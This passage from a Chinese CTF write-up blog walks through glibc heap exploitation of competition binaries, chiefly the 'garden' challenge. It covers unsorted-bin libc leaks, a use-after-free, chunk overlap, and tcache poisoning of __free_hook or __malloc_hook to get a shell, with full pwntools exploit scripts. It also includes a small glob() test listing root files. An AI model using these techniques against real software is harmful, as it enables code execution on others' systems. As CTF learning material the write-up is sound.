class="string">&quot;8.131.69.237&quot;</span>,<span class="number">45123</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">####### leak libc base #######</span></span><br><span class="line">fun(<span class="string">&quot;/home/*&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">add()   <span class="comment">#0  </span></span><br><span class="line">show(<span class="number">0</span>) <span class="comment">#   </span></span><br><span class="line">main_arena = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc.address = main_arena - <span class="number">3947384</span> -<span class="number">0x1000</span> <span class="comment">#这里做的时候库用错了，导致libc_base偏移不对，哭死</span></span><br><span class="line">info(<span class="string">&quot;libc.address &lt;======================&gt; 0x%x&quot;</span>,libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment">####### leak heap base #######</span></span><br><span class="line">add()   <span class="comment">#1  </span></span><br><span class="line">delete(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]-<span class="number">0x23</span>))</span><br><span class="line">add()   <span class="comment">#2</span></span><br><span class="line">add()   <span class="comment">#3 fake chunk</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x13</span>+p64(libc.address + one_gadget[<span class="number">3</span>]))</span><br><span class="line">add()  </span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>利用方式还是很常规的。</p>
+<h3 id="关于glob"><a href="#关于glob" class="headerlink" title="关于glob"></a>关于glob</h3><p>做个测试</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;glob.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">glob_t</span> buf;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    glob(<span class="string">&quot;/*&quot;</span>,GLOB_NOSORT, <span class="literal">NULL</span>, &amp;buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; buf.gl_pathc; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf.gl_pathv[%d]= %s \n&quot;</span>, i, (buf.gl_pathv[i]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">globfree(&amp;buf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">buf.gl_pathv[0]&#x3D; &#x2F;var </span><br><span class="line">buf.gl_pathv[1]&#x3D; &#x2F;media </span><br><span class="line">buf.gl_pathv[2]&#x3D; &#x2F;initrd.img </span><br><span class="line">buf.gl_pathv[3]&#x3D; &#x2F;bin </span><br><span class="line">buf.gl_pathv[4]&#x3D; &#x2F;flag.txt </span><br><span class="line">buf.gl_pathv[5]&#x3D; &#x2F;snap </span><br><span class="line">buf.gl_pathv[6]&#x3D; &#x2F;sbin </span><br><span class="line">buf.gl_pathv[7]&#x3D; &#x2F;swapfile </span><br><span class="line">buf.gl_pathv[8]&#x3D; &#x2F;usr </span><br><span class="line">buf.gl_pathv[9]&#x3D; &#x2F;cdrom </span><br><span class="line">buf.gl_pathv[10]&#x3D; &#x2F;proc </span><br><span class="line">buf.gl_pathv[11]&#x3D; &#x2F;vmlinuz.old </span><br><span class="line">buf.gl_pathv[12]&#x3D; &#x2F;mnt </span><br><span class="line">………………</span><br></pre></td></tr></table></figure>
+<p>可以打印出根目录下的文件名。</p>
+<h2 id="garden"><a href="#garden" class="headerlink" title="garden"></a>garden</h2><p>祥云杯第6题</p>
+<p>2.29堆题，保护全开。</p>
+<h3 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h3><p>进入main函数界面，发现看不到能输入的东西，但可以从v3&lt;=6推出有6个选项，从左边的函数栏里一个个把函数找出来。</p>
+<p><strong>1.add</strong></p>
+<p>malloc 0x100 大小的堆块，由全局指针数组索引，最多add九个。</p>
+<p><strong>2.delete</strong></p>
+<p>输入索引，将对应块free掉，无uaf。</p>
+<p><strong>3.show</strong></p>
+<p>打印某个堆块的信息，只能只用一次。</p>
+<p><strong>4.exit</strong></p>
+<p><strong>5.steal</strong></p>
+<p>free掉一个堆块，但不清空指针。也就是说给了我有一次使用uaf漏洞的机会。</p>
+<p><strong>6.back_door</strong></p>
+<p>申请一个0x20大小的堆块。</p>
+<h3 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>因为是2.29版本，有tcache，放堆块比较容易。</p>
+<p>可以尝试泄露libc基址，用uaf漏洞把堆块放到free_hook上，再free掉含有/bin/sh的堆块。</p>
+<p>但这题最大的难点在于，没有edit函数，只有在add的时候才能往一个地方写入值。如果要修改fd指针，需要把块从tcache中先取出来，再改这个位置的值，但2.29无法double free，除非有重叠堆块，否则无法操作。</p>
+<p>分析一下这个程序。</p>
+<ol>
+<li>一共有9个坑，先申请9个堆块，free前6个堆块和第9个堆块进入tcache，steal第8个堆块进unsorted-bin，期间可以泄露libc基址。</li>
+<li>此时再delete第7个堆，7坑和8坑合并为一个unsorted bin。这时调用后门函数，从unsorted bin中申请一个小堆，这时坑位会发生错位。</li>
+<li><strong>将tcache中的堆依次取出，再从unsorted bin中add一个堆6，这时堆6和堆7有重叠区域。</strong></li>
+<li>再随便delete几个堆，为之后的add腾出的空间。</li>
+<li>先delete堆7，再delete堆6。然后add堆6时可以往堆6中写入内容，此时可以把堆7的fd指针改为free_hook。</li>
+<li>add一次取出堆7，再add一次就可以把堆块分配到free_hook上了，然后再add一次把free_hook的值改为system。</li>
+<li>add一个堆写入/bin/sh，再把它free掉，相当于执行了system(”/bin/sh“)；</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,content=<span class="string">&quot;aaaa&quot;</span></span>):</span></span><br><span class="line">    p.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;tree index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&quot;tree name?&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;tree index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span>      <span class="comment">#one time</span></span><br><span class="line">    p.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;tree index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">steal</span>(<span class="params">idx</span>):</span>     <span class="comment">#one time</span></span><br><span class="line">    p.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;steal?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>():</span>    <span class="comment">#one time</span></span><br><span class="line">    p.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">file = <span class="string">&quot;./garden&quot;</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(file)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):  <span class="comment">#0-8</span></span><br><span class="line">    add(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(<span class="number">5</span>-i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">steal(<span class="number">7</span>)    <span class="comment">#unsorted-bin uaf</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">main_anare = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc.address = main_anare - <span class="number">1985696</span></span><br><span class="line">info(<span class="string">&quot;main_anare &lt;=============== 0x%x&quot;</span>,main_anare)</span><br><span class="line">info(<span class="string">&quot;libc.address &lt;=============== 0x%x&quot;</span>,libc.address) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)   <span class="comment">#chunk overlap</span></span><br><span class="line">backdoor()</span><br><span class="line">add(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(i)</span><br><span class="line">add(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0xd0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">7</span>,p64(libc.symbols[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">add(<span class="number">6</span>,<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+    <!--文末结束语-->
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;"> --- 本文结束 <i class="fas fa-heart"></i> The End --- </div>
+    
+    <!--页脚广告-->
+    
+    <v-divider></v-divider>
+    
+    <div class="post-nav">             
+        
+            <div class="post-nav-button float-left">
+                <v-icon>chevron_left</v-icon>
+                <a class="font-weight-bold text-left" href="/2020/12/30/Game/2020%20%E7%BA%B5%E6%A8%AA%E6%9D%AF/">
+                    2020 纵横杯
+                </a>
+            </div>
+              
+          
+            <div class="post-nav-button float-right">
+                <a class="font-weight-bold text-right" href="/2020/11/14/Game/2020%20%E4%B8%8A%E6%B5%B7%E8%B5%9B/">      
+                    2020 上海赛
+                </a>
+                <v-icon>chevron_right</v-icon>
+            </div>
+        
+    </div>
+</v-card>
+
+
+
+        
+                            <div id="mobile-footer" class="d-block d-md-none">
+                                <v-divider></v-divider>
+                                <div id="mobile-footer-content">
+                                    <span>Theme: <a target="_blank" rel="noopener" href="https://github.com/kb1000fx/hexo-theme-insulin">Insulin</a> &nbsp; Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a></span><br>
+                                    <span> &copy; 2020 - 2021 Clindy</span>
+                                </div>
+                            </div>                   
+                        </v-col>                                            
+                    </v-row>
+                </v-container>
+            </v-content>
+        </v-app>
+    </div>
+    
+<script src="https://cdn.jsdelivr.net/npm/vue@2.6.11"></script>
+<script src="https://cdn.jsdelivr.net/npm/vuetify@2.2.30"></script>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/js-base64@3.5.2/base64.min.js"></script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@8.4.8/dist/mermaid.min.js"></script>
+    <script>mermaid.initialize({
+        startOnLoad: true,
+        theme: "default"
+    });</script>
+
+
+
+
+
+</body>
+</html>
